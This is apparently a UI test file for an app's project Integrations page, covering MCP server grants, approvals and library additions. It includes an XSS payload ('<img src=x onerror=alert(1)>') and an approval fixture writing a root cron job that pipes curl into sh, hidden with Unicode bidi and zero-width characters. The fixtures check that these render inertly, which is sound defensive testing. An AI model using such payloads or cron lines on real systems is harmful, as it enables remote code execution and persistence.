import { expect } from 'remix/assert';
import { afterEach, describe, it } from 'remix/test';
import type { Client } from '../../api/client.ts';
import type { McpApproval } from '../../api/mcpClient.ts';
import { expiredLicense } from '../../test/fixtures.ts';
import type { McpServer } from '../../api/mcpClient.ts';
import { byLabel, byText, cleanup, mount, testServices, waitFor } from '../../test/render.tsx';
import { ProjectIntegrationsScreen } from '../integrations/project-integrations-screen.tsx';
import { devLicense, libServer, pay, projServer, rev } from './fixtures.ts';

afterEach(cleanup);

type Calls = unknown[][];
function rec<R>(calls: Calls, result: (...args: unknown[]) => R) {
  return async (...args: unknown[]) => {
    calls.push(args);
    return result(...args);
  };
}

// The project's servers (a row per connected server, the chosen one's panel under the rows), approvals and adding a server
// from the library are on the project's own Integrations page (/project/integrations).
function show(client: Partial<Client>, opts: { projects?: { id: string; name: string }[] } = {}) {
  const s = testServices({
    licenseStatus: async () => devLicense,
    appInfo: async () => ({}) as never,
    projectList: async () => (opts.projects ?? [{ id: 'prj_1', name: 'gocalc' }]) as never,
    agentList: async () => [pay, rev],
    roomList: async () => [],
    roomUnread: async () => [],
    needsYouList: async () => [],
    presenceList: async () => [],
    taskList: async () => [],
    integrationList: async () => [],
    integrationKinds: async () => [],
    mcpApprovalList: async () => [],
    mcpLibList: async () => [libServer()],
    ...client,
  });
  s.workspace.start();
  s.project.start();
  return mount(<ProjectIntegrationsScreen />, s);
}
type R = ReturnType<typeof show>;
const server = (r: R) =>
  waitFor(() => {
    const c = r.$('[data-testid="mcp-server"]');
    if (!c?.querySelector('[aria-label="Pay may use Test server"]')) throw new Error('not yet');
    return c as HTMLElement;
  }, r);

describe("the MCP servers of one project, on the project's Integrations page", () => {
  it('lists the project servers, which tools only read, and no secret', async () => {
    const r = show({ mcpServerList: async () => [projServer({ readOnlyTools: ['echo'] })] });
    const card = await server(r);
    const tools = Array.from(card.querySelectorAll('[data-testid="mcp-tool"]'));
    expect(tools.map((x) => x.textContent)).toEqual(['echo reads only', 'post_note asks you first']);
    expect(card.textContent).not.toContain('sekret');
    expect(byLabel<HTMLInputElement>(card, 'Pay may use Test server').checked).toBe(false);
    expect(card.textContent).toContain('No agent can use a server until you tick it here.');
    expect(r.$('h1')!.textContent).toContain('Integrations');
    // a project's page: no server is connected or described here, that is done once for the workspace
    expect(r.$('[data-testid="own-servers"]')).toBeNull();
    expect(r.$('[data-testid="connector-gallery"]')).toBeNull();
    // laid out like the workspace's page: Services, then Agent tools, each with its rows and the open one's panel under them
    const order = ['project-app-sync', 'project-mcp'].map((id) => r.$(`[data-testid="${id}"]`)!);
    expect(order[0]!.compareDocumentPosition(order[1]!) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
    expect(order[1]!.querySelector('h2')!.textContent).toBe('Agent tools');
    expect(r.$('[data-testid="add-from-library"]')).toBeNull();
    // the server's row: what it is, who may use it and on or off here; it is open, and the server is not offered again
    const tiles = Array.from(r.$$('[data-testid="project-server-tile"]')) as HTMLElement[];
    expect(tiles.map((x) => [x.getAttribute('data-server'), x.getAttribute('data-added'), x.getAttribute('aria-pressed')])).toEqual([['tst', 'true', 'true']]);
    expect(tiles[0]!.textContent).toContain('your own · 2 tools');
    expect(tiles[0]!.textContent).toContain('No agent may use it yet');
    expect(tiles[0]!.querySelector('[data-testid="row-status"]')!.textContent).toBe('on');
    const grid = order[1]!.querySelector('ul[aria-label="MCP servers"]')!;
    expect(grid.compareDocumentPosition(card) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
    // a click on the open tile closes its panel, another click opens it again
    await r.act(() => tiles[0]!.click());
    expect(r.$('[data-testid="mcp-server"]')).toBeNull();
    await r.act(() => tiles[0]!.click());
    await server(r);
  });

  it("names on a server's tile which of the project's agents may use it, and says when it is off here", async () => {
    const r = show({
      mcpServerList: async () => [projServer({ agents: [{ agentId: 'agt_1', tools: ['*'] }] }), projServer({ id: 'two', display: 'Second server', enabled: false })],
    });
    const tile = (id: string) => r.$(`[data-testid="project-server-tile"][data-server="${id}"]`) as HTMLElement | null;
    await waitFor(() => expect(tile('two')).not.toBeNull(), r);
    expect(tile('tst')!.textContent).toContain('Pay may use it');
    expect(tile('two')!.textContent).toContain('No agent may use it yet');
    expect(tile('two')!.querySelector('[data-testid="row-status"]')!.textContent).toBe('off');
    // one panel at a time: choosing the second opens its card instead
    await r.act(() => tile('two')!.click());
    await waitFor(() => expect(r.$('[data-testid="mcp-server"]')!.getAttribute('data-server')).toBe('two'), r);
    expect(r.$$('[data-testid="mcp-server"]')).toHaveLength(1);
    expect(byText(r.$('[data-testid="mcp-server"]')!, 'button', 'Turn on in this project')).not.toBeNull();
  });

  it('grants and revokes one agent without touching the others', async () => {
    const grants: Calls = [];
    const r = show({ mcpServerList: async () => [projServer({ agents: [{ agentId: 'agt_2', tools: ['*'] }] })], mcpServerGrant: rec(grants, () => projServer()) as never });
    const card = await server(r);
    expect(byLabel<HTMLInputElement>(card, 'Rev may use Test server').checked).toBe(true);
    await r.act(() => byLabel(card, 'Pay may use Test server').click());
    await waitFor(() => expect(grants).toEqual([['prj_1', 'tst', 'agt_1', true]]), r);
    await waitFor(() => expect(byLabel<HTMLInputElement>(card, 'Rev may use Test server').disabled).toBe(false), r);
    await r.act(() => byLabel(card, 'Rev may use Test server').click());
    await waitFor(() => expect(grants[1]).toEqual(['prj_1', 'tst', 'agt_2', false]), r);
  });

  it('lists the connected servers the project does not have, the built-in ones you connected included, each with its logo', async () => {
    const r = show({
      mcpServerList: async () => [projServer()],
      mcpLibList: async () => [libServer(), libServer({ id: 'ctx7', display: 'Context7', catalogId: 'ctx7', transport: 'http', projects: [] }), libServer({ id: 'other', display: 'Other', projects: [] })],
    });
    const tiles = await waitFor(() => {
      const l = Array.from(r.$$('[data-testid="project-server-tile"]')) as HTMLElement[];
      if (l.length !== 3) throw new Error('not yet');
      return l;
    }, r);
    // Test server is in the project already: first, and not offered again; the others follow as "not added"
    expect(tiles.map((x) => [x.getAttribute('data-server'), x.getAttribute('data-added')])).toEqual([
      ['tst', 'true'],
      ['ctx7', 'false'],
      ['other', 'false'],
    ]);
    expect(tiles[1]!.querySelector('[data-brand="context7"]')).not.toBeNull();
    expect(tiles[1]!.textContent).toContain('built into Drydock');
    expect(tiles[1]!.textContent).toContain('Not in this project');
    expect(tiles[1]!.querySelector('[data-testid="row-status"]')!.textContent).toBe('not added');
    expect(tiles[2]!.textContent).toContain('your own');
    // choosing one opens its panel under the grid, with Add to this project
    await r.act(() => tiles[2]!.click());
    const panel = await waitFor(() => r.$('[data-testid="library-server"][data-server="other"]') as HTMLElement, r);
    expect(panel.textContent).toContain('your own');
    expect(byLabel(panel, 'Add Other to this project')).not.toBeNull();
    expect(r.$('[data-testid="mcp-server"]')).toBeNull();
  });

  it('adds a connected server from the library and grants it to an agent of the project', async () => {
    const adds: Calls = [];
    const grants: Calls = [];
    let mine: McpServer[] = [];
    const r = show({
      mcpServerList: async () => mine,
      mcpLibList: async () => [libServer({ projects: [] }), libServer({ id: 'other', display: 'Other', projects: [] })],
      mcpServerAdd: rec(adds, (_p, id) => {
        mine = [projServer({ id: String(id), display: 'Other' })];
        return mine[0]!;
      }) as never,
      mcpServerGrant: rec(grants, (_p, _id, agentId) => {
        mine = [projServer({ id: 'other', display: 'Other', agents: [{ agentId: String(agentId), tools: ['*'] }] })];
        return mine[0]!;
      }) as never,
    });
    await waitFor(() => expect(r.container.textContent).toContain('No MCP servers in this project yet.'), r);
    expect(r.$('[data-testid="no-project-servers"]')!.textContent).toContain('Choose a connected server to add it.');
    // with none in the project the first of the library is open; Other is chosen from its tile
    await waitFor(() => expect(r.$('[data-testid="library-server"][data-server="tst"]')).not.toBeNull(), r);
    await r.act(() => (r.$('[data-testid="project-server-tile"][data-server="other"]') as HTMLElement).click());
    const add = await waitFor(() => byLabel<HTMLButtonElement>(r.container, 'Add Other to this project'), r);
    await r.act(() => add.click());
    await waitFor(() => expect(adds).toEqual([['prj_1', 'other']]), r);
    const card = await waitFor(() => {
      const c = r.$('[data-testid="mcp-server"][data-server="other"]');
      if (!c?.querySelector('[aria-label="Pay may use Other"]')) throw new Error('not yet');
      return c as HTMLElement;
    }, r);
    // the added server's own card opens in place of Add, and its tile says it is in the project
    await waitFor(() => expect(r.$('[data-testid="library-server"][data-server="other"]')).toBeNull(), r);
    expect(r.$('[data-testid="project-server-tile"][data-server="other"]')!.getAttribute('data-added')).toBe('true');
    await r.act(() => byLabel(card, 'Pay may use Other').click());
    await waitFor(() => expect(grants).toEqual([['prj_1', 'other', 'agt_1', true]]), r);
    await waitFor(() => expect(byLabel<HTMLInputElement>(card, 'Pay may use Other').checked).toBe(true), r);
  });

  it('a server whose tools were never listed says that ticking an agent starts its program, which one, and describes the boxes by it (M24)', async () => {
    const r = show({ mcpServerList: async () => [projServer({ tools: [], discoveredAt: 0, argv: ['node', 'C:\\srv\\main.js', '--port', '0'] })] });
    const card = await waitFor(() => {
      const c = r.$('[data-testid="mcp-server"]');
      if (!c?.querySelector('[aria-label="Pay may use Test server"]')) throw new Error('not yet');
      return c as HTMLElement;
    }, r);
    const note = card.querySelector<HTMLElement>('[data-testid="reach-note"]')!;
    expect(note.textContent).toContain('Ticking an agent below, while the tools are not known, starts this program on this computer, with your rights:');
    expect(note.querySelector('[data-testid="command-line"]')!.textContent).toBe('node C:\\srv\\main.js --port 0');
    for (const who of ['Pay', 'Rev']) expect(byLabel<HTMLInputElement>(card, `${who} may use Test server`).getAttribute('aria-describedby')).toBe(note.id);
    // Find tools is on the server's own page in Integrations (where it is connected), and so is which of its tools only read
    const links = Array.from(card.querySelectorAll('a')).filter((a) => a.textContent === 'its page in Integrations');
    expect(links.map((a) => a.getAttribute('href'))).toEqual(['/integrations/server-tst', '/integrations/server-tst']);
    // the server's row: a compact row with its state in a word
    const row = r.$('[data-testid="project-server-tile"][data-server="tst"]')!;
    expect(row.tagName).toBe('BUTTON');
    expect(row.closest('ul')!.getAttribute('aria-label')).toBe('MCP servers');
    expect(row.querySelector('[data-testid="row-status"]')!.textContent).toBe('on');
    // once the tools are known (or the server is a web address that was reached) there is nothing to say
    const known = show({ mcpServerList: async () => [projServer()] });
    const card2 = await server(known);
    expect(card2.querySelector('[data-testid="reach-note"]')).toBeNull();
    expect(byLabel<HTMLInputElement>(card2, 'Pay may use Test server').getAttribute('aria-describedby')).toBeNull();
  });

  it('a ticked grant shows at once while the core answers, and goes back when the core refuses', async () => {
    let release: (ok: boolean) => void = () => {};
    const r = show({
      mcpServerList: async () => [projServer()],
      mcpServerGrant: (() => new Promise((res, rej) => (release = (ok) => (ok ? res(projServer()) : rej(new Error('refused')))))) as never,
    });
    const card = await server(r);
    const box = byLabel<HTMLInputElement>(card, 'Pay may use Test server');
    await r.act(() => box.click());
    r.root.flush();
    expect(byLabel<HTMLInputElement>(card, 'Pay may use Test server').checked).toBe(true);
    await r.act(() => release(false));
    await waitFor(() => expect(byLabel<HTMLInputElement>(card, 'Pay may use Test server').checked).toBe(false), r);
  });

  it('points to the Integrations page when nothing is connected', async () => {
    const r = show({ mcpServerList: async () => [], mcpLibList: async () => [] });
    const p = await waitFor(() => {
      const el = Array.from(r.$$('p')).find((x) => x.textContent?.includes('No servers are connected yet.'));
      if (!el) throw new Error('not yet');
      return el;
    }, r);
    expect(p.textContent).toContain('Integrations');
    expect(p.querySelector('a')!.getAttribute('href')).toBe('/integrations');
  });

  it('takes a server out of the project only after a confirmation, and keeps it connected for the workspace', async () => {
    const removes: Calls = [];
    const r = show({ mcpServerList: async () => [projServer()], mcpServerRemove: rec(removes, () => undefined) as never });
    const card = await server(r);
    await r.act(() => byText(card, 'button', 'Take out of this project').click());
    expect(removes).toEqual([]);
    expect(card.textContent).toContain('it stays connected for the workspace');
    await r.act(() => byText(card, 'button', 'Yes, take it out').click());
    await waitFor(() => expect(removes).toEqual([['prj_1', 'tst']]), r);
  });

  it('turns a server off for this project only', async () => {
    const sets: Calls = [];
    const r = show({ mcpServerList: async () => [projServer()], mcpServerSetEnabled: rec(sets, () => projServer({ enabled: false })) as never });
    const card = await server(r);
    await r.act(() => byText(card, 'button', 'Turn off in this project').click());
    await waitFor(() => expect(sets).toEqual([['prj_1', 'tst', false]]), r);
  });

  it('shows a call waiting for approval as inert text and sends the decision for exactly that approval', async () => {
    const ap: McpApproval = { id: 'apr_1', server: 'tst', tool: 'post_note', agentId: 'agt_1', args: '{"text":"<img src=x onerror=alert(1)>"}', created: 1760000000000, expiresAt: 1760001800000, projectId: 'prj_1' };
    const decisions: Calls = [];
    const r = show({ mcpServerList: async () => [projServer()], mcpApprovalList: async () => [ap], mcpApprovalDecide: rec(decisions, () => undefined) as never });
    const box = await waitFor(() => {
      const b = r.$('[data-testid="mcp-approval"]');
      if (!b?.textContent?.includes('Pay')) throw new Error('not yet');
      return b as HTMLElement;
    }, r);
    expect(box.textContent).toContain('<img src=x onerror=alert(1)>');
    expect(box.querySelector('img')).toBeNull();
    await r.act(() => byText(box, 'button', 'Reject').click());
    await waitFor(() => expect(decisions).toEqual([['apr_1', false]]), r);
  });

  // audit 2026-10-16, H8
  it('shows where an approval goes, says when the arguments are cut, and writes out characters that are not drawn', async () => {
    const ap: McpApproval = {
      id: 'apr_2',
      server: 'tst',
      tool: 'wr\u202Eite',
      agentId: 'agt_1',
      args: '{"path":"/etc/cron.d/job\u200B","body":"* * * * * root curl x|sh...[90210 bytes not shown]...done"}',
      targets: ['/etc/cron.d/job\u200B'],
      shortened: true,
      created: 1760000000000,
      expiresAt: 1760001800000,
      projectId: 'prj_1',
    };
    const r = show({ mcpServerList: async () => [projServer()], mcpApprovalList: async () => [ap] });
    const box = await waitFor(() => {
      const b = r.$('[data-testid="mcp-approval"]');
      if (!b) throw new Error('not yet');
      return b as HTMLElement;
    }, r);
    expect(box.querySelector('[data-testid="mcp-approval-targets"]')!.textContent).toBe('/etc/cron.d/job\\u{200b}');
    expect(box.querySelector('[data-testid="mcp-approval-shortened"]')!.textContent).toContain('Part of this input is not shown');
    expect(box.querySelector('[data-testid="mcp-approval-hidden"]')).not.toBeNull();
    expect(box.querySelector('h3')!.textContent).toContain('wr\\u{202e}ite');
    expect(box.querySelector('pre')!.textContent).toContain('/etc/cron.d/job\\u{200b}');
    expect(box.textContent).not.toContain('\u202E');
    expect(box.textContent).not.toContain('\u200B');
  });

  it('read-only: approving and turning on or off are disabled, rejecting is not', async () => {
    const ap: McpApproval = { id: 'apr_1', server: 'tst', tool: 'post_note', agentId: 'agt_1', args: '{}', created: 1, expiresAt: 2, projectId: 'prj_1' };
    const r = show({ licenseStatus: async () => expiredLicense, mcpServerList: async () => [projServer()], mcpApprovalList: async () => [ap] });
    const box = await waitFor(() => {
      const b = r.$('[data-testid="mcp-approval"]');
      if (!b) throw new Error('not yet');
      return b as HTMLElement;
    }, r);
    await waitFor(() => expect(byText<HTMLButtonElement>(box, 'button', 'Approve this call').disabled).toBe(true), r);
    expect(byText<HTMLButtonElement>(box, 'button', 'Reject').disabled).toBe(false);
    const card = await server(r);
    expect(byText<HTMLButtonElement>(card, 'button', 'Turn off in this project').disabled).toBe(true);
  });

  it('re-reads the servers when an MCP event arrives', async () => {
    let list = [projServer()];
    const r = show({ mcpServerList: async () => list });
    await server(r);
    list = [projServer(), projServer({ id: 'two', display: 'Second server' })];
    r.services.store.ingest({ seq: 5000, time: '', type: 'mcp.server_added' } as never);
    await waitFor(() => expect(r.$$('[data-testid="project-server-tile"][data-added="true"]').length).toBe(2), r);
  });

  it('without a project: one line says servers are put into a project, and offers to create one', async () => {
    const r = show({ mcpServerList: async () => [] }, { projects: [] });
    const line = await waitFor(() => {
      const el = r.$('[data-testid="no-project"]');
      if (!el) throw new Error('not yet');
      return el as HTMLElement;
    }, r);
    expect(line.querySelector('a[href="/project/new"]')).not.toBeNull();
    // connecting needs no project: the line points to the workspace's Integrations page
    expect(line.querySelector('a[href="/integrations"]')).not.toBeNull();
    expect(r.$('[data-testid="mcp-approvals"]')).toBeNull();
  });
});
